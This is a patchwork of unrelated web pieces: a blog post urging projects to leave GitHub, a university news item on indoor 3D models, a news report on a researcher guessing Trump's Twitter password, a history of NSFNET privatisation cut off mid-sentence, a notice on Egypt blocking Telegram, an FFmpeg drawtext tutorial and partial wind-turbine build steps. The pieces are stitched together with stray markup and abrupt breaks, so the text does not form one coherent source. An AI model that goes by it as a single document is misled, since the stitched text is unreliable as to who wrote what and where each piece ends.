<p>Microsoft is very actively purchasing important projects related to Open Source and in April 2020 it was announced that they had now also acquired <a href="https://en.wikipedia.org/wiki/Npm_(software)">npm</a>, a JavaScript packaging vendor, for an undisclosed sum of money.</p>
<p>Perhaps the younger generations don't know anything about the past "evils" of Microsoft and naively believe that Microsoft is now the good friend to Open Source, but the truth is that all these acquisitions of Open Source projects is a business tactic that is put in place to improve Microsoft's loosing position to Open Source. It is a matter of control.</p>
<p>Just yesterday <a href="https://www.minecraft.net/en-us/article/java-edition-moving-house">Microsoft announced</a> that Minecraft will require a Microsoft account to play in 2021 and that owners of the classic version will be forced to migrate.</p>
<p>While this is not related to Open Source, it is a really good example of how bad it can get if Microsoft sometime in the future decides that projects on GitHub are required to do something which goes against these projects interests.</p>
<p>I will not name any names, because that is not important, but how in the world can any Open Source project that regards their code base as valuable not make sure that they have a completely up to date copy of every single line of code outside of GitHub!?</p>
<p>Some project developers only keep parts on the code in personal repositories, others haven't even got a backup but trust fully that GitHub will always have a working and current release of the latests commits.</p>
<p>For years people have warned about the position GitHub had in the world of Open Source because it concentrates too much of the power to make or break the community in a single entity. Having Microsoft behind the steering wheel makes the situation a thousand times worse.</p>
<p>Nobody in their right mind would ever have imagined uploading Open Source code to Microsoft servers just a decade ago. Microsoft where the archenemy of Open Source in the nineties and they deployed all kinds of dirty tactics to keep other operating systems out of the market, especially dirty tactics against Linux. In the early 2000s the then CEO Steve Ballmer said, <q>Linux is a cancer that attaches itself in an intellectual property sense to everything it touches.</q> And for many years they tried to gain control over Linux and manipulated the market in different ways in order to "crush the competition". When they realized they couldn't do that and that the battle was lost, they deployed a new tactic in which they instead try to make money of Linux, which is what that are doing now in a lot of areas, and which is why they seem "friendlier" to the Open Source community.</p>
<p>I myself do have some code residing on GitHub (haven't had the time to migrate yet), but nothing of my code is important what so ever, and I of course have multiple up-to-date clones and backups elsewhere. However, having the worlds largest repository of Open Source code still reside in the hands of Microsoft is just madness. Why haven't all the major projects migrated? Running a self-hosting Git server isn't that difficult and there even exists several solutions that are pretty solid.</p>
<p>More and more of all the good stuff about Open Source and community driven development and sharing of resources, code and experience is slowly getting either gobbled up or ruined and massacred by big corporations or economically based foundations. Why is it that as soon as money enters into the picture everything turns into crap? Of course, greed is the answer, but an even more important question than that is: Why is it that we have stopped caring?</p>
<p>Large projects should self-host their repositories in order to stay completely independent, but some alternative solutions to the more popular services such as GitHub, GitLab and BitBucket does exist (not an exhaustive list):</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main"><div><div><p><span></span>Wednesday 21 October 2020</p><div data-autointrotext=""><p><b>In case of an emergency, first responders like the fire brigade need up-to-date information. 2D maps are a common source of information but they can be difficult to read in an emergency situation. UT PhD-student Shayan Nikoohemat created an algorithm that can accurately generate 3D models of the insides of large buildings from point clouds.</b></p><p>Indoor 3D models are the digital twins of building interiors. The 3D models could be used by first responders to get a good impression of large buildings, like shopping malls, a hospital or a sports complex, on their way to the emergency. 2D maps represent important information – like the location of emergency exits – on tangled floor plans, making them difficult too read quickly and after each reconstruction, these maps are outdated. “Sometimes, these maps are so outdated that the real building looks completely different than the floor plans. We need a fast and reliable approach to create the digital 3D model of interiors.”, says Shayan.</p><h2><a id="from-point-clouds-to-3d-map"></a>From point clouds to 3d map</h2><p>Luckily, laser scanners can quickly scan a whole building after every reconstruction. However, these scanners create point clouds, unstructured data which still has to be converted into a 3D model. The data doesn’t know if a scanned point is a wall, an exit or, for example, a table. According to Shayan, his program solved this: “For my PhD thesis, I created&nbsp;algorithms that automatically understand the data and can create 2D and 3D maps. We can detect and model doors, stairs, obstacles and navigable areas which are crucial data for the emergency planning.”</p><p><img src="https://1348661504.rsc.cdn77.org/.uc/ia68fda4b010288850e01584947034c146ab17af56d340701c4eb00bf0080/u4spzp0rofycx9foknvzw.png" alt="" width="235" height="191"><img src="https://1348661504.rsc.cdn77.org/.uc/i90ed1dbe010289850e01584947033c8b580b7352190d0701c4f300a40080/dmfesmsqurzdg6at3vcxgw.png" alt="" width="243" height="164"> </p><p><i>Figure 1: The point clouds and final 3D Model of the fire brigade building in Haaksbergen</i></p><h2><a id="recognizing-elements"></a>Recognizing elements</h2><p>The algorithm can recognize different structural elements such as walls, slabs, ceilings, and openings. Individual items like furniture, however, still pose a problem. “It is not yet able to correctly label everything, but the structural elements are enough to create an accurate map, which we tested on several real datasets,” he says. During his postdoc, he will further develop the system to also work for individual items. Huib Fransen of the Safety Region Rotterdam-Rijnmond was delighted with the results: “Shayan’s project is exciting for us and we were happy to provide him with the scanning sites for test cases.”&nbsp;</p><h2><a id="more-information"></a>MORE INFORMATION</h2><p>Shayan did his research and is now working as a postdoc at the Department of Earth Observation Sciences (EOS; Faculty ITC) and was supervised by Prof.Dr.Ir. M.G. Vosselman. His research project was initiated by the UT, TU Delft, and the Dutch FireBrigade (iNowit, Brandweer Nederland) and industry partners&nbsp;(CGI, Cyclomedia and Leap3D) and the Open Geospatial Consortium (OGC) to support disaster management in public buildings. The project was funded through&nbsp;<a href="http://maps4society.nl/">the NWO Partnership Programme Map4Society</a>. Shayan defended his PhD thesis, titled&nbsp;<i>Indoor 3D Reconstruction of Buildings from Point Clouds</i>, on 21 October.</p></div></div><div><div><p>K.W.

Gevers took screenshots when he had access to Trump’s account. These screenshots were shared with <i>de Volkskrant </i>by the monthly opinion magazine&nbsp;<a href="https://www.vn.nl/trump-twitter-hacked-again/" target="_blank">Vrij Nederland</a>. Dutch security experts find Gevers’ claim credible.</p><p data-element-id="f7d4-df7f-98ec-67eb-d049-540f-292a-5617">The Dutchman alerted Trump and American government services to the security leak. After a few days, he was contacted by the American Secret Service in the Netherlands. This agency is also responsible for the security of the American President and took the report seriously, as evidenced by correspondence seen by de Volkskrant. Meanwhile Trump’s account has been made more secure.</p><p data-element-id="cd30-cedb-07c2-93d7-a663-5828-30a5-5d9a">This is not the first time that Dutch hackers succeeded in taking over Donald Trump’s Twitter account. The first time was four years ago, just before the 2016 elections, when three hackers jointly managed to retrieve Trump’s password and access his account. That someone has now succeeded again, is remarkable. During the previous presidential elections Russian hackers attempted to influence the elections on a large scale. Subsequently, social media have taken various steps to prevent manipulation.</p><p data-element-id="cb67-ef02-5e43-1c58-e530-8e49-5d42-7cd2">Today as well, barely three weeks before the presidential elections, attempts are being made from Russia and Iran to digitally influence the elections. Obviously, the President’s Twitter account is a target too. Twitter declines to respond on the record, stating that they never comment on security measures for individual accounts. Ronald Prins, founder of security company Hunt &amp; Hackett and one of the best-known Dutch security experts, says: ‘I’ve known Victor Gevers for quite a few years. He has a reputation of devoting his life to finding vulnerabilities and always adopts a very ethical attitude in doing so. On the basis of what I know and have seen, his claim seems credible.’</p><h3 data-element-id="3cd7-0aef-c61e-659e-e0e2-9543-03a8-128f">2016 hack</h3><p data-element-id="720f-405b-63d6-f369-e9e8-6270-6c66-658a">Victor Gevers was also one of the three hackers who logged into Trump’s account in 2016. ‘That we would succeed in doing it again so soon, was not planned’, he says about the buildup to the action. The reason for making another attempt to hack Trump’s account was the reporting in the US about Hunter Biden. A hard disk owned by presidential candidate Joe Biden’s son was supposedly stolen or hacked – also because Hunter Biden used an easy to guess password (Hunter02). Gevers is familiar with leaked databases of old passwords and searched these for Hunter Biden’s data. After analysing these old databases, he felt that the information was incorrect. Hunter Biden used other passwords. Gevers: ‘I could tell that it wasn’t his password.’</p><p data-element-id="75db-2de2-faf8-fc31-16d0-d99f-b879-3ccd">It gives him the idea to check how good the security of verified Twitter accounts actually is. He looks at the account of Susan Rice, the former US national security adviser, and at that of Joe Biden. And also takes a look at Donald Trump, while he’s at it. ‘Doing spot checks, that’s my work: look for any leaks in security.’</p><p data-element-id="d4fd-0bc3-c406-a8b0-3268-6c9e-8769-2843">Earlier discoveries by Gevers include an enormous Chinese database with the location data of 2.7 million inhabitants of Xinjang – China’s largest province and home to the Uyghurs. The poorly secured database contained all kinds of personal data: people’s ID number, nationality, phone number, date of birth, photos, employer, but also GPS coordinates of the places these individuals had visited. The existence of this database made it even clearer how meticulously China is monitoring the Uyghur minority in the country.</p><p data-element-id="45f1-e3ef-2f67-eaca-666a-a367-2947-c3e4">On Friday morning, almost absentmindedly, Gevers tries a number of passwords and their variations. On the fifth attempt: bingo! He tries ‘maga2020!’ (short for make America great again) and suddenly finds himself in the Twitter account of the American President. He is flabbergasted. Gevers: ‘I expected to be blocked after four failed attempts. Or at least would be asked to provide additional information.’ None of that.</p><p data-element-id="0a49-c680-a98e-21e9-d291-70bc-18bf-975f">On that Friday morning, Gevers has access to what is perhaps the most important Twitter account in the world and is in a position to send a message to 87 million people, the attentive world press, and government leaders. Gevers: ‘I did think: “Here we go again”.’</p><h3 data-element-id="5342-211d-6946-9cf2-ebf8-89fd-fcd1-b8c2">Illegal</h3><p data-element-id="2da9-1ce3-bc38-1f09-e397-5636-d20b-c1a1">After all, hacking an account is illegal. If Gevers wants to make it clear that he is acting with good intentions, he will have to proceed responsibly and document his steps. He takes screenshots. Then he sends an email to Donald Trump – ‘I still had an old email account of his’ – and sends a copy to the American organisation for digital security. He kindly advises Trump to take extra security measures. And perhaps use a somewhat longer password. Gevers even suggests one: !IWillMakeAmericaGreatAgain2020!, and adds instructions for activating two-step verification. ‘But I didn’t get a reply.’</p><p data-element-id="f6ea-8910-66b0-bf9a-95b6-b615-5fea-8aaf">So, he tries to warn others. Trump’s campaign team, his family. He sends messages via Twitter asking if someone will call Trump’s attention to the fact that his Twitter account is not safe. He tags the CIA, the White House, the FBI, Twitter themselves. No response.</p><p data-element-id="aac2-5921-f32c-921b-6962-09da-fe3a-ed47">Gevers: ‘Then on Saturday, I suddenly saw that two-step verification for the account had been activated.’ Two days later, in the evening, he receives an email from the American Secret Service. ‘Friendly. They were interested in my information. I forwarded everything to them.’ On Tuesday they speak digitally. They thank Gevers, telling him that they were unaware of the security leak. This still leaves the security researcher with a number of questions: ‘Why is it possible for someone from a different time zone to log into such an important account? Why doesn’t Twitter demand better passwords? If I can access his account, then foreign nations can do so as well, right? Why aren’t the persons who are supposed to protect the President informed when someone reports that his account is unsafe?’</p><h3 data-element-id="6701-b1b1-7279-551d-015e-e20b-5efc-6540">Surprisingly easy</h3><p data-element-id="c0f4-6fcc-64af-62c3-2b8d-84c3-109f-6fac">Matthijs Koot, security researcher at Secura, is also astonished at how easy it was for Gevers to take over Trump’s account. ‘To put it harshly: people who in the year 2020 still ignore basic advice on online security are a potential danger to themselves and to those around them.’</p><p data-element-id="47c2-0c2c-b48f-fc57-7b10-7e05-6d7f-065f">According to Koot, these risks also affect others. ‘Today, we are increasingly interconnected, which means that a hack of one individual’s account or computer may also undermine the privacy and security of others. After all, via Trump’s account you can also see private messages sent to him or refer others to links containing malware or to a fake login page.’ This raises the question of how responsible Twitter is when it comes to additional security measures. Koot: ‘They should either compel people to use additional authentication or, if people really don’t want this, make them use a complex password. The days of logging in with just a weak password are over.’</p><p data-element-id="364a660b-32af-4ff8-b17b-8a49a27d61d8"><span>Twitter declines to respond to questions. The question remains why Trump was using such a weak and simple password. Gevers has a possible explanation: ‘Trump is over 70 – elderly people often switch off two-step verification because they find it too complicated. My own mother, for instance. For younger generations digital security is more self-evident.’</span></p></section></section></div>]]>

<p>In the summer of 1986, Senator Al Gore, Jr., of Tennessee introduced an amendment to the Congressional Act that authorized the&nbsp; budget of the National Science Foundation (NSF). He called for the federal government to study the possibilities for “communications networks for supercomputers at universities and Federal research facilities.” To explain the purpose of this legislation, Gore called on a striking analogy:&nbsp;</p>



<blockquote><p>One promising technology is the development of fiber optic systems for voice and data transmission. Eventually we will see a system of fiber optic systems being installed nationwide. America’s highways transport people and materials across the country. Federal freeways connect with state highways which connect in turn with county roads and city streets. T<em>o transport data and ideas,</em> <em>we will need a telecommunications highway connecting users coast to coast, state to state, city to city</em>. The study required in this amendment will identify the problems and opportunities the nation will face in establishing that highway.<sup>1</sup></p></blockquote>



<p>In the following years, Gore and his allies would call for the creation of an “information superhighway”, or, more formally, a national information infrastructure (NII). As he intended, Gore’s analogy to the federal highway system summons to mind a central exchange that would bind together various local and regional networks, letting all American citizens communicate with one another. However, the analogy also misleads – Gore did not propose the creation of a federally-funded and maintained data network. He envisioned that the information superhighway, unlike its concrete and asphalt namesake, would come into being through the action of market forces, within a regulatory framework that would ensure competition, guarantee open, equal access to any service provider (what would later be known as “net neutrality”), and provide subsidies or other mechanisms to ensure universal service to the least fortunate members of society, preventing the emergence of a gap between the information rich and information poor.<sup>2</sup></p>



<p>Over the following decade, Congress slowly developed a policy response to the growing importance of computer networks to the American research community, to education, and eventually to society as a whole. Congress’ slow march towards an NII policy, however, could not keep up with the rapidly growing NSFNET, overseen by the neighboring bureaucracy of the executive branch. Despite its reputation for sclerosis, bureaucracy was created exactly because of its capacity, unlike a legislature, to respond to events immediately, without deliberation. And so it happened that, between 1988 and 1993, the NSF crafted the policies that would determine how the Internet became private, and thus went public. It had to deal every year with novel demands and expectations from NSFNET’s users and peer networks. In response, it made decisions on the fly, decisions which rapidly outpaced Congressional plans for guiding the development of an information superhighway. These decisions rested largely in the hands of a single man – Stephen Wolff.</p>



<h2>Acceptable Use</h2>



<p>Wolff earned a Ph.D. in electrical engineering at Princeton in 1961 (where he would have been a rough contemporary of Bob Kahn), and began what might have been a comfortable academic career, with a post-doctoral stint at Imperial College, followed by several years teaching at Johns Hopkins. But then he shifted gears, and took a position&nbsp; at the Ballistics Research lab in Aberdeen, Maryland. He stayed there for most of the 1970s and early 1980s, researching communications and computing systems for the U.S. Army. He introduced Unix into the lab’s offices, and managed Aberdeen’s connection to the ARPANET.<sup>3</sup></p>



<p>In 1986, the NSF recruited him to manage the NSF’s supercomputing backbone – he was a natural fit, given his experience connecting Army supercomputers to ARPANET. He became the principal architect of NSFNET’s evolution from that point until his departure in 1994, when he entered the private sector as a manager for Cisco Systems. The original intended function of the net that Wolff was hired to manage had been to connect researchers across the U.S. to NSF-funded supercomputing centers. As we saw last time, however, once Wolff and the other network managers saw how much demand the initial backbone had engendered, they quickly developed a new vision of NSFNET, as a communications grid for the entire American research and post-secondary education community.</p>



<p>However, Wolff did not want the government to be in the business of supplying network services on a permanent basis. In his view, the NSF’s role was to prime the pump, creating the initial demand needed to get a commercial networking services sector off the ground. Once that happened, Wolff felt it would be improper for a government entity to be in competition with viable for-profit businesses. So he intended to get NSF out of the way by privatizing the network, handing over control of the backbone to unsubsidized private entities and letting the market take over.</p>



<p>This was very much in the spirit of the times. Across the Western world, and across most of the political spectrum, government leaders of the 1980s touted privatization and deregulation as the best means to unleash economic growth and innovation after the relative stagnation of the 1970s. As one example among many, around the same time that NSFNET was getting off the ground, the FCC knocked down several decades-old constraints on corporations involved in broadcasting. In 1985, it removed the restriction on owning print and broadcast media in the same locality, and two year later it nullified the fairness doctrine, which had required broadcasters to present multiple views on public-policy debates.&nbsp;</p>



<p>From his post at NSF, Wolff had several levers at hand for accomplishing his goals. The first lay in the interpretation and enforcement of the network’s acceptable use policy (AUP). In accordance with NSF’s mission, the initial policy for the NSFNET backbone, in effect until June 1990, required all uses of the network to be in support of “scientific research and other scholarly activities.” This is quite restrictive indeed, and would seem to eliminate any possibility of commercial use of the network. But Wolff chose to interpret the policy liberally. Regularly mailing list postings about new product releases from a corporation that sold data processing software – was that not in support of scientific research? What about the decision to allow MCI’s email system to connect to the backbone, at the urging of Vint Cerf, who had left government employ to oversee the development of MCI Mail. Wolff rationalized this – and other later interconnections to commercial email systems such as CompuServe’s – as in support of research by making it possible for researchers to communicate digitally with a wider range of people that they might need to contact in the pursuit of their work. A stretch, perhaps. But Wolff saw that allowing some commercial traffic on the same infrastructure that was used for public NSF traffic would encourage the private investment needed to support academic and educational use on a permanent basis.&nbsp;</p>



<p>Wolff’s strategy of opening the door of NSFNET as far as possible to commercial entities got an assist from Congress in 1992, when Congressman Rick Boucher, who helped oversee NSF as chair of the Science Subcommittee, sponsored an amendment to the NSF charter which authorized any additional uses of NSFNET that would “tend to increase the overall capabilities of the networks to support such research and education activities.” This was an<em> ex post facto </em>validation of Wolff’s approach to commercial traffic, allowing virtually any activity as long as it produced profits that encouraged more private investment into NSFNET and its peer networks.&nbsp;&nbsp;</p>



<h2>Dual-Use Networks</h2>



<p>Wolff also fostered the commercial development of networking by supporting the regional networks’ reuse of their networking hardware for commercial traffic. As you may recall, the NSF backbone linked together a variety of not-for-profit regional nets, from NYSERNet in New York to Sesquinet in Texas to BARRNet in northern California. NSF did not directly fund the regional networks, but it did subsidize them indirectly, via the money it provided to labs and universities to offset the costs of their connection to their neighborhood regional net. Several of the regional nets then used this same subsidized infrastructure to spin off a for-profit commercial enterprise, selling network access to the public over the very same wires used for the research and education purposes sponsored by NSF. Wolff encouraged them to do so, seeing this as yet another way to accelerate the transition of the nation’s research and education infrastructure to private control.&nbsp;</p>



<p>This, too, accorded neatly with the political spirit of the 1980s, which encouraged private enterprise to profit from public largesse, in the expectation that the public would benefit indirectly through economic growth. One can see parallels with the dual-use regional networks in the 1980 Bayh-Dole Act, which defaulted ownership of patents derived from government-funded research to the organization performing the work, not to the government that paid for it.&nbsp;</p>



<p>The most prominent example of dual-use in action was PSINet, a for-profit company initially founded as Performance Systems International in 1988. William Schrader and Martin Schoffstall, the co-founder of NYSERNet and one of vice presidents’, respectively, created the company. Schofstall, a former BBN engineer and co-author of the Simple Network Management Protocol (SNMP) for managing the devices on an IP network, was the key technical leader. Schrader, an ambitious Cornell biology major and MBA who had helped his <em>alma mater </em>set up its supercomputing center and get it connected to NSFNET, provided the business drive. He firmly believed that …</p></div></div>

<p>Technology and Law Community “Masaar” documented the blocking of the Telegram website and application by the Egyptian authorities on 22 October 2020. The authorities blocked Telegram on three of the Internet service networks operating in Egypt. These networks included “We”, “Vodafone” and “Orange”. Masaar learned about the blocking action after complaints from several users of the Internet services on the three networks, stating that they cannot access the application or the website. It should be noted that Telegram is one of the most popular and widespread encrypted chat applications in the world.</p>
<p>Masaar confirms that users of the three networks: We (AS8452), Orange (AS24863) and Vodafone (AS36935) cannot use Telegram application on smartphones, as the Egyptian authorities have blocked access to IP addresses of the application.</p>
<p>The authorities also have blocked the Telegram website itself (telegram.org) and the version of Telegram used for desktop computers (web.telegram.org). Further, the blocking involved ADSL and mobile internet (4G / 3G).</p>
<p>It is noteworthy that last September “Masaar” had <a href="https://masaar.net/en/blocked-websites-in-egypt/">published a web page declaring that the authorities have blocked 596 websites and 32 alternative links</a> since May 2017.</p>

<p><strong>Learn FFmpeg’s drawtext filter to dynamically overlay text on video and display information such as timecode, frame resolution, watermarks, etc. Also, let’s learn how to configure the font, font-size, position, background-color, alignment, multiple lines, etc. using FFmpeg’s drawtext filter.</strong></p>




<h2 id="step-0-ensure-your-ffmpeg-is-compiled-with-libfreetype"><span id="Step_0_Ensure_your_FFmpeg_Is_Compiled_with_libfreetype"></span>Step 0: Ensure your FFmpeg Is Compiled with libfreetype<span></span></h2>



<p>In order to use&nbsp;<code>drawtext</code>, you needed to have configured FFmpeg with&nbsp;<code>--enable-libfreetype</code>. As per the documentation, you need the following options as well if you want to,</p>



<ul><li>enable default font fallback and the font option you need to configure FFmpeg with&nbsp;<code>--enable-libfontconfig</code>.</li><li>enable the text_shaping option, you need to configure FFmpeg with&nbsp;<code>--enable-libfribidi</code>.</li></ul>



<h2 id="complete-list-of-options-for-drawtext"><span id="Complete_List_of_Options_for_drawtext"></span>Complete List of Options for drawtext<span></span></h2>



<p>The complete list of options for&nbsp;<code>drawtext</code>&nbsp;filter can be accessed&nbsp;<a href="https://ffmpeg.org/ffmpeg-filters.html#Syntax" target="_blank" rel="noopener">here</a>. It is far too much for me to explain here, but, if you have any questions, that is the first place you should refer.</p>



<p>In this article, I’ll walk through several common use-cases that should make the concepts easy to understand.</p>



<h2 id="display-text-on-the-video-using-drawtext-filter"><span id="Display_Text_on_the_Video_using_drawtext_filter"></span>Display Text on the Video using drawtext filter<span></span></h2>



<p>Here is the commandline and an explanation of the options</p>



<pre><code>ffmpeg -i inputClip.mp4 -vf "drawtext=text='My text starting at 640x360':x=640:y=360:fontsize=24:fontcolor=white" -c:a copy output.mp4</code></pre>



<p>Here,</p>



<ul><li><code>inputClip.mp4</code>&nbsp;is the input video on which you want to display the text; and the output (containing the text) is to be stored in&nbsp;<code>output.mp4</code></li><li>no audio re-encoding as indicated by&nbsp;<code>-c:a copy</code></li><li>we use the drawtext filter as indicated by the commands&nbsp;<code>-vf "drawtext=........"</code></li><li><code>text='My text starting at 640x360'</code>&nbsp;is the text that will be shown on the video (you could make it your name for watermarking the video, right?)</li><li>position of the text<ul><li><code>x=640:y=360</code>&nbsp;indicates that the x and y coordinates as&nbsp;<code>640px</code>&nbsp;and&nbsp;<code>360px</code>. Also, as a side note, the video’s resolution is&nbsp;<code>1280x720</code>.</li><li>font size is&nbsp;<code>24</code></li><li>font color is&nbsp;<code>white</code></li></ul></li></ul>



<p>Let’s see how the output looks, shall we?</p>

<p>A better way to this is to offset the text by the length of the text that you are printing on the screen.</p>



<p>Confused?</p>



<p>If you look at the image above, you’ll see that it starts at the center of the video and extends towards the right.</p>



<p><strong>If you want to center the text itself, then you can subtract the height and width of the rendered text when telling&nbsp;<code>drawtext</code>&nbsp;where to render the text.</strong></p>



<p>Here’s how. You use the command&nbsp;<code>x=(w-text_w)/2:y=(h-text_h)/2</code>&nbsp;and it will center the text. Here is our new commandline –</p>



<pre><code>ffmpeg -i inputClip.mp4 -vf "drawtext=text='Centered Text':x=(w-text_w)/2:y=(h-text_h)/2:fontsize=24:fontcolor=white" -c:a copy output.mp4</code></pre>



<p>Now, the text looks nice and pretty 🙂</p>

<p><strong>Fantastic – you now know how to overlay text onto a video using FFmpeg’s&nbsp;<code>drawtext</code>&nbsp;filter. Do you think you can add your own watermark or copyright? Let’s try 🙂</strong></p>



<h2 id="adding-a-copyright-notice-or-text-watermark-using-ffmpegs-drawtext-filter"><span id="Adding_a_Copyright_notice_or_Text_Watermark_using_FFmpeg%E2%80%99s_drawtext_filter"></span>Adding a Copyright notice or Text Watermark using FFmpeg’s drawtext filter<span></span></h2>



<p>Let’s modify the command as follows to indicate my name and the copyright symbol.</p>



<pre><code>ffmpeg -i inputClip.mp4 -vf "drawtext=text='© Krishna':x=640:y=360:fontsize=24:fontcolor=white" -c:a copy output.mp4</code></pre>



<p>This produces an output like this – looks good right? You can play around with the&nbsp;<code>x</code>&nbsp;and&nbsp;<code>y</code>&nbsp;coordinates to align the text the way you want to.</p>

<h2 id="adding-text-with-background-color-using-ffmpegs-drawtext-filter"><span id="Adding_Text_with_Background_Color_using_FFmpeg%E2%80%99s_drawtext_filter"></span>Adding Text with Background Color using FFmpeg’s drawtext filter<span></span></h2>



<p>To add a background color, we need</p>



<pre><code>ffmpeg -i inputClip.mp4 -vf "drawtext=text='© Krishna':x=(1100-text_w):y=(600-text_h):fontsize=32:fontcolor=black:box=1:boxcolor=white@0.5: boxborderw=5" -c:a copy output.mp4</code></pre>



<p>The new commands here are –</p>



<ul><li><code>box</code>&nbsp;: this is either&nbsp;<code>1</code>&nbsp;(enabled) or&nbsp;<code>0</code>&nbsp;(disabled)</li><li><code>boxcolor:&nbsp;white@0.5</code>&nbsp;implies a white colored box with a 50% opacity.</li><li><code>boxborderw</code>&nbsp;is the width of the box’s border and the border color is taken from&nbsp;<code>boxcolor</code>.</li></ul>



<p>And there you have it, text with a background. In this example, I switched the color of the text to black so that it contrasts well with a light background bounding box (which in-turn contrasts well with a dark background.)</p>

<h2 id="displaying-timecodes--timestamps-using--ffmpegs-drawtext-filter"><span id="Displaying_TimeCodes_/_TimeStamps_using_FFmpeg%E2%80%99s_drawtext_filter"></span>Displaying TimeCodes / TimeStamps using FFmpeg’s drawtext filter<span></span></h2>



<p>This is a very useful application of the&nbsp;<code>drawtext</code>&nbsp;filter and is used in demonstrating low-latency applications or visual quality testing so that one knows precisely what the timestamps/timecodes are at each time.</p>



<pre><code>ffmpeg -i inputClip.mp4 -vf "drawtext=text='timestamp: %{pts \: hms}': x=500: y=500: fontsize=32:fontcolor=yellow@0.9: box=1: boxcolor=black@0.6" -c:a copy output.mp4</code></pre>



<p>This uses the&nbsp;<code>timestamp</code>&nbsp;and&nbsp;<code>pts</code>&nbsp;options to display time in hour:min:sec format using the&nbsp;<code>hms</code>&nbsp;format specifier. The notations and formatting are complex in my opion! So, a lot of trial and error might be needed before you format your display correctly.</p>



<p>Here is how the video looks. Hope Vimeo shows you the video without a lot of delay 🙂</p>

</div></figure>



<p>And here is the same command, but using the&nbsp;<code>flt</code>&nbsp;option to provide microsecond time accuracy! Fancy 🙂</p>



<pre><code>ffmpeg -i inputClip.mp4 -vf "drawtext=text='timestamp: %{pts \: flt}': x=500: y=500: fontsize=32:fontcolor=yellow@0.9: box=1: boxcolor=black@0.6" -c:a copy output.mp4

<h2 id="display-movie-credits-using-ffmpegs-drawtext-filter"><span id="Display_Movie_Credits_using_FFmpeg%E2%80%99s_drawtext_filter"></span>Display Movie Credits using FFmpeg’s drawtext filter<span></span></h2>



<p>Finally, let’s learn how to show a movie’s credits using the draw text filter. Here are two main concepts that you need to understand.</p>



<ul><li>providing a lot of text: you can’t do this via the commandline, so, you need to read a text file that contains the text. And you can read that using the&nbsp;<code>textfile</code>&nbsp;option.</li><li>and, specify the speed of scrolling using the&nbsp;<code>y</code>&nbsp;text position. Here, you can provide an equation instead of a constant number. You start off by telling by FFmpeg that the y-position is&nbsp;<code>h - 80*t</code>&nbsp;so that everytime the value of time increases, the value of&nbsp;<code>h - 80*t*</code>&nbsp;decreases, and the text is displayed higher. Makes sense?</li></ul>



<p><strong>Tip: change&nbsp;<code>80</code>&nbsp;to&nbsp;<code>100</code>&nbsp;or&nbsp;<code>120</code>&nbsp;and see the effect on the scrolling speed.</strong></p>



<pre><code>ffmpeg -i inputClip.mp4 -vf "drawtext=textfile=credits.txt: x=200: y=h-80*t: fontsize=36:fontcolor=yellow@0.9: box=1: boxcolor=black@0.6" -c:a copy outputCredits.mp4
</code></pre>



<p>Here is the output:</p>

<p>That’s it for this tutorial on using FFmpeg’s&nbsp;<code>drawtext</code>&nbsp;filter to produce dynamic overlays on your videos. It is a very versatile and handy tool that you can use to overlay text, timecodes, credits, copyrights notices on your videos.</p>

<p><strong><a name="desc" id="desc"></a>Description:</strong></p><p>

  This is a Vertical Axis Wind Turbine which uses wind energy to  drive things like an alternator/generator for producing electricity,  or air and water pumps for cooling, irrigation and similar.<br>
  The  turbine uses the 35-40% mechanically efficient Lenz2 lift+drag  design. It is made almost entirely from scrap materials, and should  cost about $15-$30 for the six vane version, which can be made by two  people in four hours without much effort. <br>
The three vane  version has been successfully survival tested to 80 km/h sustained  winds and the six vane version to 105 km. Both will do more, but  exactly how much has not yet been ascertained. The current longest  running version has been up since early 2014, through reasonable  storms, with no noticeable wear and tear as of yet.</p>
<iframe width="320" height="180" src="https://www.youtube.com/embed/8oe6egO0YOc" frameborder="0" allowfullscreen=""></iframe>

<p>Full power curves have yet to be calculated for this  particular build, but according to Mr Ed Lenz's calculations a six  vane at 0.91 meters diameter and 1.1 meters high with a 90% efficient  alternator should produce at least 130 watts of electricity in a 30  km/h wind, and 1 kilowatt at 60 km/h. </p><p>
The materials  listed in this tutorial are to make the three vane version. Double  everything except the bike wheel for six vanes.

<p><a name="steps" id="steps"></a>
<strong>Step by step build instructions:</strong></p>
<p>These relate to the animation to the left. </p>
<p><strong>Step 1:</strong><br>
  Download and print the two template  files from the links above. Make sure they're printed at 100% (200  dpi). When printed measure the distance between the dimension arrows,  it should be 10cm on both pages. If it's a couple mm off that's  probably ok.</p>
<p>Tape the pages together so that the 10cm dimension marks overlap  as closely as possible. Best way to do this is on a window pane  during the day, so you can see both pages showing through.<br>
  With  a craft knife and the angle aluminium as a straight edge, cut out the  outer border of the template.<br>
  Any time you're cutting, always  make sure your other hand is never in front of the knife, so if you  slip you're not going to slice yourself. The angle aluminium is good  for this, as the vertical bit effectively shields the hand holding  it.</p>
<p><strong>2</strong><strong>:</strong><br>
  Take an aluminium sheet  and measure a box 42cm x 48cm. Draw a line half way up the 48cm  length so you have two boxes measuring 42cm x 24cm. Score the outer  lines with the Stanley knife and straight edge. You're not trying to  cut through the metal, just create a line that can then be popped out  later. A good method is to score once lightly, then a second time a  bit deeper.<br>
  Do not score the 24cm halfway line.</p>
<p>Flex the metal so that it bends at a score line, then flex back  the other way. Do this a couple times and it should split. Do the  same for the other score and remove the outer metal. Keep it for  later. </p>
<p><strong>3</strong><strong>:</strong><br>
  Tape the template to the  metal rectangle (from now on to be referred to as a 'former') so that  the long edge of the paper sits on the middle line and the right hand  edges of both line up. Don't worry if the other edges don't align  perfectly.</p>
<p>With blade and straight edge, score out the template curve,  including the triangles at each end. It's not essential that this be  100% perfect, but try to get the first one reasonably nice as you can  then use it as a template for the rest.</p>
<p>Score, flex, and remove the two triangles of metal outside the  template.</p>
<p><strong>4</strong><strong>:</strong><br>
  Mark the centers of the  little circles on the paper template with a marker pen so that  they're visible from the other side and flip the paper over so that  the printed side is down on the other half of the former, keeping the  long edge on the middle line. Retape so it doesn't shift.<br>
  Give  the curved score a couple of flexes and tear it out. Remove the two  small triangles. Be careful not to bend the unscored metal too much  as you're doing this as it may weaken it.</p>
<p>You now have your first former. Repeat steps 2 through 3 so that  you have a total of 6 formers. You can use the first former as a  cutting template rather than the paper. On three of the formers have  the 24cm line drawn on the front, the other three on the back.</p>
<p><strong>5</strong><strong>:</strong><br>
  Take all six formers and peg them together  so that they are as nicely aligned as possible.<br>
  Use tape to  attach them if you don't have clothes pegs. </p>
<p>Drill each of the 16 holes through all six formers with a 4mm bit.  Drill the center hole first, as this is the only one that needs to be  reasonably accurate. It can help to put a bolt through that first  hole to keep the formers from shifting around as you drill.</p>
